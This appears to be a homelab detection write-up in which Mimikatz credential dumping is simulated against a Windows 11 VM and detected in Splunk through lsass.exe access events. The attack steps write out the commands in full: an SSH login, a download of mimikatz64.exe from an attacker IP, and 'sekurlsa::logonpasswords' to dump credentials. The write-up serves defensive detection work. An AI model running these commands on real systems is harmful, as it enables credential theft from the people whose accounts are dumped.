

# Detection Usecase 4 : Credentials Dumping with Mimikatz


# Scenario Summary: 

An Attacker has gain a local access to a machine, he attempts to run Mimikatz in the system to dump all the credentials.

# Attack Steps:

Here, Virtual Windows 11 is the victim where universal forwarder is running,  
and Virtual Kali Linux is the attacker.  
- The Attack was simulated by Kali Linux on Windows as follows:  

1) Attacker logged into the system using SSH:   
```
ssh sshuser@192.168.0.101
```  
2) Downloaded the mimikatz and executed it:    
```
Invoke-WebRequest -URI http://192.168.0.106:8888/mimikatz64.exe -Outfile C:\Users\sshuser\mimi64.exe
./mimi64.exe "privilege::debug"
./mimi64.exe "log"
./mimi64.exe "sekurlsa::logonpasswords"

```  

- Tools Used:  
    - Attacker Tool : SSH, Mimikatz.    
    - SIEM : Splunk Free  
    - Log Source : Windows Security Event Logs, Sysmon  


# Event ID / Data Source Mapping:

| Source                    | EventCode | Description                             |
|---------------------------|-----------|-----------------------------------------|
| WinEventLog : Security    | 4656      | A handle to an object was requested     |
| WinEventLog : Security    | 4663      | An attempt was made to access an object |

# Detection Query / Logic:
```spl 
- Search : lsass.exe
index=* EventCode=4663 Object_Name="*lsass.exe"
```

# Sample Alert Screenshot

1) Attacker Downloaded Mimikatz and executed it:  

![mimikatz](<logs/Screenshot 2025-05-28 173020.png>)  

2) Mimikatz tried to access lsass process for memory dump:  

![req](<logs/Screenshot 2025-05-29 134342.png>)  
![access](<logs/Screenshot 2025-05-29 134418.png>)

3) Many attempt was made to access lsass process: 

![log](<logs/Screenshot 2025-05-29 134928.png>)


# Analyst Notes / Recommendations:

* What Should an Analyst do ? 

-> Investigate and Verify Mimikatz Execution(EventID = 1) and check the alert if someone accessed the Lsass Process.  
-> Try to correlate it with any previous event to understand attacker context(e.g., Account Used or Source IP / Host etc).   
-> If Mimikatx execution is confirmed : Isolate the system , Force Password-reset for logged-in users.  
-> Now check the system for any lateral movement which attacker usually do after running Mimikatz.  
-> Preserve the Evidence & Trigger an incident response.     
-> Document & Report the incident.


# Detection Status

 -> Successfully Detected.  
